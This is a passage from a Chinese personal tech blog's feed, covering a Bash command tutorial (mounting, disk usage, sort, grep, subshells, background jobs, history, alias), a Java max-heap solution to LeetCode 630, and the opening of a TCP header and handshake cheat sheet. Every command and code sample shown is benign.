命令用来将设备挂载到一个挂载点，当不加任何参数时，会显示目前所有挂载的设备</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount</span></span><br><span class="line">/dev/sdb on / type ext4 (rw,relatime,discard,errors=remount-ro,data=ordered)</span><br><span class="line">(后面的省略了)</span><br></pre></td></tr></table></figure><p>从左到右分别为</p><ul><li>媒体的设备文件名（<code>/dev/sdb</code>）</li><li>挂载点（<code>/</code>）</li><li>文件系统（<code>ext4</code>）</li><li>访问状态（<code>rw,relatime,discard,errors=remount-ro,data=ordered</code>）</li></ul><p>想要挂载设备一般使用 <code>mount -t &lt;fstype&gt; &lt;device&gt; &lt;dir&gt;</code></p><p><code>umount</code> 则是用来卸载设备，使用 <code>umount &#123;directory|device&#125;</code> 来卸载设备。卸载设备时如果有任何设备上的文件正在被使用便无法卸载，可以使用 <code>lsof</code> 命令查看当前设备上的有哪些文件正在被使用。</p><h3 id="查看剩余空间"><a class="markdownIt-Anchor" href="#查看剩余空间"></a> 查看剩余空间</h3><p><code>df</code> 命令可以查看设备上剩余的磁盘空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> df -h</span></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/sdb        251G   14G  225G   6% /</span><br><span class="line">tmpfs           6.3G     0  6.3G   0% /mnt/wsl</span><br><span class="line">tools           953G  544G  410G  58% /init</span><br><span class="line">tmpfs           6.3G     0  6.3G   0% /sys/fs/cgroup</span><br><span class="line">C:\             953G  544G  410G  58% /mnt/c</span><br><span class="line">D:\             1.9T  1.2T  695G  63% /mnt/d</span><br></pre></td></tr></table></figure><p><code>-h</code> 参数能让输出中的磁盘空间按照用户易读的形式显示。</p><p><code>du</code> 命令可以查看某个特定目录（默认情况下是当前目录）的磁盘使用情况，<code>-h</code> 按用户易读的格式输出， <code>-d</code> 指定深度:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> du -hd 1</span></span><br><span class="line">32K     ./src</span><br><span class="line">20K     ./.idea</span><br><span class="line">348K    ./lib</span><br><span class="line">32K     ./bin</span><br></pre></td></tr></table></figure><h2 id="处理数据文件"><a class="markdownIt-Anchor" href="#处理数据文件"></a> 处理数据文件</h2><h3 id="排序"><a class="markdownIt-Anchor" href="#排序"></a> 排序</h3><p><code>sort</code> 命令可以用来排序数据，默认情况下会按照默认语言的排序规则对文本文件中的数据行排序。使用 <code>-n</code> 将文本当作数字，按照数字值来排序。<code>-t</code> 参数可以用于指定分割符，<code>-k</code> 参数可以指定按照分隔符分割后按照哪些列来排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.txt </span><br><span class="line">alice 1 5</span><br><span class="line">frank 2 4</span><br><span class="line">david 3 3</span><br><span class="line">tom 4 2</span><br><span class="line">jerry 5 1</span><br><span class="line">$ sort -t &#x27; &#x27; -k 1 test.txt </span><br><span class="line">alice 1 5</span><br><span class="line">david 3 3</span><br><span class="line">frank 2 4</span><br><span class="line">jerry 5 1</span><br><span class="line">tom 4 2</span><br><span class="line">virgil@Virgil-Y7KP:~$ sort -t &#x27; &#x27; -k 3 test.txt</span><br><span class="line">jerry 5 1</span><br><span class="line">tom 4 2</span><br><span class="line">david 3 3</span><br><span class="line">frank 2 4</span><br><span class="line">alice 1 5</span><br></pre></td></tr></table></figure><h3 id="搜索"><a class="markdownIt-Anchor" href="#搜索"></a> 搜索</h3><p>可以使用 <code>grep</code> 命令来搜索数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat test.txt</span> </span><br><span class="line">alice 1 5</span><br><span class="line">frank 2 4</span><br><span class="line">david 3 3</span><br><span class="line">tom 4 2</span><br><span class="line">jerry 5 1</span><br><span class="line"><span class="meta">$</span><span class="bash"> grep alice test.txt</span> </span><br><span class="line">alice 1 5</span><br><span class="line"><span class="meta">$</span><span class="bash"> grep -vn alice test.txt (反向搜索+显示匹配行号)</span></span><br><span class="line">frank 2 4</span><br><span class="line">david 3 3</span><br><span class="line">tom 4 2</span><br><span class="line">jerry 5 1</span><br><span class="line"><span class="meta">$</span><span class="bash"> grep -c [12] test.txt (正则表达式+匹配行数量)</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure><h1 id="理解-shell"><a class="markdownIt-Anchor" href="#理解-shell"></a> 理解 shell</h1><h2 id="shell-的父子关系"><a class="markdownIt-Anchor" href="#shell-的父子关系"></a> shell 的父子关系</h2><h3 id="启动子shell"><a class="markdownIt-Anchor" href="#启动子shell"></a> 启动子shell</h3><p>我们可以在一个shell中启动另外一个shell程序，包括自己：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bash</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> bash</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> bash</span></span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><p>看起来没有效果，但是如果使用我们之前学到的 <code>ps</code> 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -f --forest</span></span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">virgil   20692 20691  0 14:33 pts/0    00:00:00 /bin/bash --login</span><br><span class="line">virgil   20722 20692  0 14:33 pts/0    00:00:00  \_ bash</span><br><span class="line">virgil   20733 20722  0 14:33 pts/0    00:00:00      \_ bash</span><br><span class="line">virgil   20750 20733  0 14:33 pts/0    00:00:00          \_ bash</span><br><span class="line">virgil   20968 20750  0 14:36 pts/0    00:00:00              \_ ps -f --forest</span><br></pre></td></tr></table></figure><p>可以发现我们每一次都创建了一个子shell，子shell的父进程ID就是父shell。同样的我们可以用 <code>exit</code> 来方便的退出当前shell:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line">exit</span><br><span class="line"><span class="meta">$</span><span class="bash"> ps -f --forest</span></span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">virgil   20692 20691  0 14:33 pts/0    00:00:00 /bin/bash --login</span><br><span class="line">virgil   20722 20692  0 14:33 pts/0    00:00:00  \_ bash</span><br><span class="line">virgil   20733 20722  0 14:33 pts/0    00:00:00      \_ bash</span><br><span class="line">virgil   21224 20733  0 14:38 pts/0    00:00:00          \_ ps -f --forest</span><br></pre></td></tr></table></figure><h3 id="进程列表"><a class="markdownIt-Anchor" href="#进程列表"></a> 进程列表</h3><p>再shell中我们可以再一行中输入多个命令，只要使用 <code>;</code> 分割就可以：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span> ; ls ; <span class="built_in">cd</span> /etc ; <span class="built_in">pwd</span> ; <span class="built_in">cd</span> ; <span class="built_in">pwd</span> ; ls</span></span><br><span class="line">/home/virgil</span><br><span class="line">App       Go    LeetCode-solutions              Vblog  cf-project  go      myblog  test.txt</span><br><span class="line">Download  Java  LeetCodeCN-Submissions-Crawler  c      cide.deb    go.mod  snap</span><br><span class="line">/etc</span><br><span class="line">/home/virgil</span><br><span class="line">App       Go    LeetCode-solutions              Vblog  cf-project  go      myblog  test.txt</span><br><span class="line">Download  Java  LeetCodeCN-Submissions-Crawler  c      cide.deb    go.mod  snap</span><br></pre></td></tr></table></figure><p>但是如果在这些命令的外部添加小括号：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">pwd</span> ; ls ; <span class="built_in">cd</span> /etc ; <span class="built_in">pwd</span> ; <span class="built_in">cd</span> ; <span class="built_in">pwd</span> ; ls)</span></span><br><span class="line">/home/virgil</span><br><span class="line">App       Go    LeetCode-solutions              Vblog  cf-project  go      myblog  test.txt</span><br><span class="line">Download  Java  LeetCodeCN-Submissions-Crawler  c      cide.deb    go.mod  snap</span><br><span class="line">/etc</span><br><span class="line">/home/virgil</span><br><span class="line">App       Go    LeetCode-solutions              Vblog  cf-project  go      myblog  test.txt</span><br><span class="line">Download  Java  LeetCodeCN-Submissions-Crawler  c      cide.deb    go.mod  snap</span><br></pre></td></tr></table></figure><p>结果并没有什么不同，但是实际上我们如果在括号内添加一条命令来查看进程：\</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">pwd</span> ; ls ; <span class="built_in">cd</span> /etc ; <span class="built_in">pwd</span> ; <span class="built_in">cd</span> ; <span class="built_in">pwd</span> ; ls ; ps -f --forest)</span></span><br><span class="line">/home/virgil</span><br><span class="line">App       Go    LeetCode-solutions              Vblog  cf-project  go      myblog  test.txt</span><br><span class="line">Download  Java  LeetCodeCN-Submissions-Crawler  c      cide.deb    go.mod  snap</span><br><span class="line">/etc</span><br><span class="line">/home/virgil</span><br><span class="line">App       Go    LeetCode-solutions              Vblog  cf-project  go      myblog  test.txt</span><br><span class="line">Download  Java  LeetCodeCN-Submissions-Crawler  c      cide.deb    go.mod  snap</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">virgil   21450 21449  0 14:40 pts/0    00:00:00 /bin/bash --login</span><br><span class="line">virgil   21926 21450  0 14:44 pts/0    00:00:00  \_ /bin/bash --login</span><br><span class="line">virgil   21929 21926  0 14:44 pts/0    00:00:00      \_ ps -f --forest</span><br></pre></td></tr></table></figure><p>你会发现括号内的命令其实是在一个子shell中运行的，命令运行完后子shell便会退出。</p><h3 id="子shell妙用"><a class="markdownIt-Anchor" href="#子shell妙用"></a> 子shell妙用</h3><p>我们可以使用后台模式让某个命令在后台运行，同时让出shell让我们可以做别的事情，例如 <code>sleep</code> 命令可以让产生指定时间的时延：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sleep 3</span><br><span class="line">(过了三秒)</span><br><span class="line">$ </span><br></pre></td></tr></table></figure><p>在这段时间内你输入的任何指令都是无效的，他们在sleep结束后才会被shell执行，但是如果在命令结尾添加一个 <code>&amp;</code> 那么sleep命令就会被置入后台，shell也不会被占用，同时终端会返回后台任务的作业号和PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sleep 3 &amp;</span><br><span class="line">[1] 24210</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>我们整一个长时间的sleep来观察一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sleep 20 &amp;</span><br><span class="line">[1] 24338</span><br><span class="line">$ ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">virgil   21450 21449  0 14:40 pts/0    00:00:00 /bin/bash --login</span><br><span class="line">virgil   24338 21450  0 15:12 pts/0    00:00:00 sleep 20</span><br><span class="line">virgil   24339 21450  0 15:12 pts/0    00:00:00 ps -f</span><br></pre></td></tr></table></figure><p>sleep命令确实在另外一个线程中运行了，对于在后台的任务，我们可以用 <code>jobs</code> 命令查看。</p><p>讲完后台命令后，同样的你可以把一个子shell（进程列表）置入后台，例如当你想使用tar命令归档多个目录，又想同时做一些其他的事情，那么你就可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ (tar -cf Rich.tar /home/rich ; tar -cf My.tar /home/christine)&amp; </span><br><span class="line">[3] 2423 </span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="shell-内置命令"><a class="markdownIt-Anchor" href="#shell-内置命令"></a> shell 内置命令</h2><p>例如 <code>ps</code> 这样的命令并不是shell内置的命令，在执行他们时，shell创建一个新的子线程去执行他们。同样的，shell也有许多内置命令，运行内部命令时shell不需要创建子线程去执行他们。</p><h3 id="history-命令"><a class="markdownIt-Anchor" href="#history-命令"></a> <code>history</code> 命令</h3><p>想要查看最近使用过的命令，可以使用 <code>history</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ history</span><br><span class="line">    1  pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls</span><br><span class="line">    2  cd</span><br><span class="line">    3  pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls</span><br><span class="line">    4  (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls)</span><br><span class="line">    5  ps -f --forest</span><br><span class="line">    6  ```shell</span><br><span class="line">    7  $ (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls)</span><br><span class="line">    8  /home/virgil</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>想要快速重新执行上调指令，只需要输入 <code>!!</code>，想要快速执行之前的某条指令，只需要 <code>!&lt;指令编号&gt;</code>。</p><h3 id="alias-别名"><a class="markdownIt-Anchor" href="#alias-别名"></a> <code>alias</code> 别名</h3><p>你你可以随时创建别名，例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">alias</span> li=<span class="string">&#x27;ls -li&#x27;</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> li</span></span><br><span class="line">total 2232</span><br><span class="line"> 4503599628128469 -rwxrwxrwx 1 virgil virgil    1952 Jun 26 15:59 _config.yml</span><br><span class="line"> 1970324837790266 -rwxrwxrwx 1 virgil virgil 2013043 Aug 14 23:21 db.json</span><br><span class="line"> 8162774325390266 drwxrwxrwx 1 virgil virgil    4096 Jun 26 16:03 node_modules</span><br><span class="line"> 3096224744602326 -rwxrwxrwx 1 virgil virgil  261591 Jun 26 16:03 package-lock.json</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常用-bash-shell-命令&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#常用-bash-shell-命令&quot;&gt;&lt;/a&gt; 常用 Bash Shell 命令&lt;/h1&gt;
&lt;h2 id=&quot;监测程序&quot;&gt;&lt;a class=&quot;markdownI</summary>
      
    
    
    
    <category term="Linux" scheme="https://virgilchen97.github.io/categories/Linux/"/>
    
    
    <category term="Shell" scheme="https://virgilchen97.github.io/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>630-课程表 III</title>
    <link href="https://virgilchen97.github.io/2020/09/630-%E8%AF%BE%E7%A8%8B%E8%A1%A8-III/"/>
    <id>https://virgilchen97.github.io/2020/09/630-%E8%AF%BE%E7%A8%8B%E8%A1%A8-III/</id>
    <published>2020-09-21T15:46:17.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<p>这里有 <code>n</code> 门不同的在线课程，他们按从 <code>1</code> 到 <code>n</code> 编号。每一门课程有一定的持续上课时间（课程时间）<code>t</code> 以及关闭时间第 <code>d</code> 天。一门课要持续学习 <code>t</code> 天直到第 <code>d</code> 天时要完成，你将会从第 <code>1</code> 天开始。</p><p>给出 <code>n</code> 个在线课程用 <code>(t, d)</code> 对表示。你的任务是找出最多可以修几门课。</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入: [[100, 200], [200, 1300], [1000, 1250], [2000, 3200]]</span><br><span class="line">输出: 3</span><br><span class="line">解释: </span><br><span class="line">这里一共有 4 门课程, 但是你最多可以修 3 门:</span><br><span class="line">首先, 修第一门课时, 它要耗费 100 天，你会在第 100 天完成, 在第 101 天准备下门课。</span><br><span class="line">第二, 修第三门课时, 它会耗费 1000 天，所以你将在第 1100 天的时候完成它, 以及在第 1101 天开始准备下门课程。</span><br><span class="line">第三, 修第二门课时, 它会耗时 200 天，所以你将会在第 1300 天时完成它。</span><br><span class="line">第四门课现在不能修，因为你将会在第 3300 天完成它，这已经超出了关闭日期。</span><br></pre></td></tr></table></figure><p><strong>提示</strong>:</p><p>整数 <code>1 &lt;= d</code>, <code>t,n &lt;= 10,000</code> 。<br />你不能同时修两门课程。</p><span id="more"></span><h1 id="解法"><a class="markdownIt-Anchor" href="#解法"></a> 解法</h1><p>在本题中我们首先想到的就是对所有课程按照最晚结束时间升序排列，因为早结束的课程我们肯定会优先安排。</p><p>接下来我们观察到，如果在第 <code>0</code> 天到第 <code>i</code> 天最多选择 <code>k</code> 门课程，那么有 <code>c1 + c2 + ... + ck &lt;= di</code>, 那么接下来在第 <code>i + 1</code> 天，如果 <code>c1 + c2 + ... + ck + ci+1&lt;= di+1</code>, 那么我们直接选择第 <code>i+1</code> 门课就行了。如果 <code>c1 + c2 + ... + ck + ci+1 &gt;= di+1</code>, 那么我们则可以挑选这 <code>k + 1</code> 天中耗时最长的课程从课程中删去，这样我们才会有最多的空余时间安排接下来的课程。</p><p>由于我们需要随时找出所有课程中时间最长的课程，因此我们使用大顶堆来解决。</p><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">scheduleCourse</span><span class="params">(<span class="keyword">int</span>[][] courses)</span> </span>&#123;</span><br><span class="line">        PriorityQueue&lt;Integer&gt; q = <span class="keyword">new</span> PriorityQueue&lt;&gt;((a,b)-&gt;b-a);</span><br><span class="line">        Arrays.sort(courses, (c1, c2) -&gt; c1[<span class="number">1</span>] - c2[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">int</span> curr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> [] course:courses) &#123;</span><br><span class="line">            curr += course[<span class="number">0</span>];</span><br><span class="line">            q.add(course[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span>(curr &gt; course[<span class="number">1</span>])&#123;</span><br><span class="line">                curr -= q.poll();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这里有 &lt;code&gt;n&lt;/code&gt; 门不同的在线课程，他们按从 &lt;code&gt;1&lt;/code&gt; 到 &lt;code&gt;n&lt;/code&gt; 编号。每一门课程有一定的持续上课时间（课程时间）&lt;code&gt;t&lt;/code&gt; 以及关闭时间第 &lt;code&gt;d&lt;/code&gt; 天。一门课要持续学习 &lt;code&gt;t&lt;/code&gt; 天直到第 &lt;code&gt;d&lt;/code&gt; 天时要完成，你将会从第 &lt;code&gt;1&lt;/code&gt; 天开始。&lt;/p&gt;
&lt;p&gt;给出 &lt;code&gt;n&lt;/code&gt; 个在线课程用 &lt;code&gt;(t, d)&lt;/code&gt; 对表示。你的任务是找出最多可以修几门课。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;输入: [[100, 200], [200, 1300], [1000, 1250], [2000, 3200]]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;输出: 3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;解释: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;这里一共有 4 门课程, 但是你最多可以修 3 门:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;首先, 修第一门课时, 它要耗费 100 天，你会在第 100 天完成, 在第 101 天准备下门课。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;第二, 修第三门课时, 它会耗费 1000 天，所以你将在第 1100 天的时候完成它, 以及在第 1101 天开始准备下门课程。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;第三, 修第二门课时, 它会耗时 200 天，所以你将会在第 1300 天时完成它。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;第四门课现在不能修，因为你将会在第 3300 天完成它，这已经超出了关闭日期。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;提示&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;整数 &lt;code&gt;1 &amp;lt;= d&lt;/code&gt;, &lt;code&gt;t,n &amp;lt;= 10,000&lt;/code&gt; 。&lt;br /&gt;
你不能同时修两门课程。&lt;/p&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://virgilchen97.github.io/categories/LeetCode/"/>
    
    
    <category term="优先队列" scheme="https://virgilchen97.github.io/tags/%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>网络知识速查</title>
    <link href="https://virgilchen97.github.io/2020/08/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E9%80%9F%E6%9F%A5/"/>
    <id>https://virgilchen97.github.io/2020/08/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E9%80%9F%E6%9F%A5/</id>
    <published>2020-08-12T09:30:51.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tcp"><a class="markdownIt-Anchor" href="#tcp"></a> TCP</h1><h2 id="报文结构"><a class="markdownIt-Anchor" href="#报文结构"></a> 报文结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          Source Port          |       Destination Port        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                        Sequence Number                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Acknowledgment Number                      |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Data |           |U|A|P|R|S|F|                               |</span><br><span class="line">| Offset| Reserved  |R|C|S|S|Y|I|            Window             |</span><br><span class="line">|       |           |G|K|H|T|N|N|                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|           Checksum            |         Urgent Pointer        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                             data                              |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h2 id="三次握手"><a class="markdownIt-Anchor" href="#三次握手"></a> 三次握手</h2><p><img src="img/(2020-08-12)%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E9%80%9F%E6%9F%A5.md/2020-08-12-17-54-43.png" alt="" /></p><h3 id="1-第一次握手syn1-seqx"><a class="markdownIt-Anchor" href="#1-第一次握手syn1-seqx"></a> 1. 第一次握手(SYN=1, seq=x):</h3><p>客户端发送一个 TCP 的 SYN 标志位置1的包，指明客户端打算连接的服务器的端口，以及初始序号 X,保存在包头的序列号(Sequence Number)字段里。</p><p>发送完毕后，客户端进入 SYN_SEND 状态。</p><h3 id="2-第二次握手syn1-ack1-seqy-acknumx1"><a class="markdownIt-Anchor" href="#2-第二次握手syn1-ack1-seqy-acknumx1"></a> 2. 第二次握手(SYN=1, ACK=1, seq=y, ACKnum=x+1):</h3><p>服务器发回确认包(ACK)应答。即 SYN 标志位和 ACK 标志位均为1。服务器端选择自己 ISN 序列号，放到 Seq 域里，同时将确认序号(Acknowledgement Number)设置为客户的 ISN 